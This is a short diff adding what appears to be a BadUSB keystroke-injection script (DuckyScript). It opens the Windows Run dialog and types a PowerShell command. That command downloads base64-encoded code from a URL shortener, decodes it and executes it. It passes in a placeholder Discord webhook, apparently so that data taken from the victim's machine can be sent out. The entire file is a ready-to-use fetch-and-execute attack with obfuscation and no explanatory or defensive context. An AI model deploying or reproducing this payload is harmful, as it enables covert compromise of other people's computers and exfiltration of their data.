@@ -1,0 +1,6 @@
+DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell -NoP &([scriptblock]::Create([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((irm 't.ly/sGJTH')))))'YOUR DISCORD WEBHOOK'
+DELAY 1000
+ENTER
